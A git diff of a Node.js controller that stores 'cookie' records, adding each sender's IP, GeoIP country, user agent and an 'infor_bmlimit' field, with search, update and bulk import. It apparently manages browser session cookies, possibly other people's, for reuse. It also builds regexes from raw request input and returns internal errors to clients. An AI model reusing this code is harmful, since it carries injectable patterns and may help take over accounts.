@@ -1,47 +1,60 @@
 let Data = require('../model/data')
 let Account = require('../model/account')
+var geoip = require('geoip-lite');
 module.exports = {
     add_data: async function(req, res){
-        let filterAccount = {
-            token: req.body.token,
-            status: true,
-            isdelete: false,
-            role: 10
-        }
-        let checkToken = await Account.findOne(filterAccount)
-        if(checkToken !== null){
-            let data = Data({
-                cookie: req.body.cookie.trim(),
-                note: req.body.note.trim(),
-                isalive: true,
+        try{
+            var ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
+            var geo = geoip.lookup(ip);
+            var nation = geo.country
+            let filterAccount = {
+                token: req.body.token,
+                status: true,
                 isdelete: false,
-                dateTime: new Date()
-            })
-            let check = await Data.findOne({
-                cookie: req.body.cookie.trim()
-            });
-            if(check !== null){
-                res.status(400).json({
-                    message: "Dữ liệu đã tồn tại"
-                });
-            }else{
-                let rs_save = await data.save()
-                if(rs_save != null){
-                    res.status(200).json({
-                        message: "Thêm dữ liệu thành công",
-                    })
-                }else{
-                    res.status(400).json({
-                        message: "Thêm dữ liệu thất bại"
-                    });
-                }
+                role: 10
             }
-        }else{
+            let checkToken = await Account.findOne(filterAccount)
+            if(checkToken !== null){
+                let data = Data({
+                    cookie: req.body.cookie.trim(),
+                    note: req.body.note.trim(),
+                    isalive: true,
+                    isdelete: false,
+                    dateTime: new Date(),
+                    ip: ip ? ip : null,
+                    nation: nation ? nation : null, 
+                    useragent: req.body.useragent.trim(),
+                    infor_bmlimit: req.body.infor_bmlimit.trim(),
+                })
+                let check = await Data.findOne({
+                    cookie: req.body.cookie.trim()
+                });
+                if(check !== null){
+                    res.status(400).json({
+                        message: "Dữ liệu đã tồn tại"
+                    });
+                }else{
+                    let rs_save = await data.save()
+                    if(rs_save != null){
+                        res.status(200).json({
+                            message: "Thêm dữ liệu thành công",
+                        })
+                    }else{
+                        res.status(400).json({
+                            message: "Thêm dữ liệu thất bại"
+                        });
+                    }
+                }
+            }else{
+                res.status(400).json({
+                    message: "Phiên đăng nhập hết hạn"
+                });
+            }
+        }catch(ex){
             res.status(400).json({
-                message: "Phiên đăng nhập hết hạn"
+                message: ex.message
             });
         }
-        
     },
     get_data: async function(req, res){
         let filterAccount = {
@@ -73,6 +86,18 @@ module.exports = {
             }
             if(req.body.isalive){
                 filter.isalive = req.body.isalive
+            }
+            if(req.body.infor_bmlimit){
+                filter.infor_bmlimit = new RegExp(req.body.infor_bmlimit.trim(), 'i')
+            }
+            if(req.body.useragent){
+                filter.useragent = new RegExp(req.body.useragent.trim(), 'i')
+            }
+            if(req.body.ip){
+                filter.ip = new RegExp(req.body.ip.trim(), 'i')
+            }
+            if(req.body.nation){
+                filter.nation = new RegExp(req.body.nation.trim(), 'i')
             }
             if(req.body.start_date){
                 let start_date = new Date(req.body.start_date + " 07:00")
@@ -164,6 +189,11 @@ module.exports = {
                     isalive: (req.body.isalive) ? req.body.isalive : check.isalive,
                     note: (req.body.note) ? req.body.note : check.note,
                     cookie: (req.body.cookie) ? req.body.cookie : check.cookie,
+                    ip: (req.body.ip) ? req.body.ip : check.ip,
+                    nation: (req.body.nation) ? req.body.nation : check.nation,
+                    useragent: (req.body.useragent) ? req.body.useragent : check.useragent,
+                    infor_bmlimit: (req.body.infor_bmlimit) ? req.body.infor_bmlimit : check.infor_bmlimit,
+                    updateTime: new Date()
                 }
                 let rsUpdate = await Data.findOneAndUpdate(filter, update)
                 if(rsUpdate){
@@ -209,6 +239,10 @@ module.exports = {
                             note: note,
                             isdelete: false,
                             isalive: true,
+                            ip: req.body.ip.trim(),
+                            nation: req.body.nation.trim(),
+                            useragent: req.body.useragent.trim(),
+                            infor_bmlimit: req.body.infor_bmlimit.trim(),
                         })
                         let importCookie = await newCookie.save();
                         if(i+1 == arr.length){
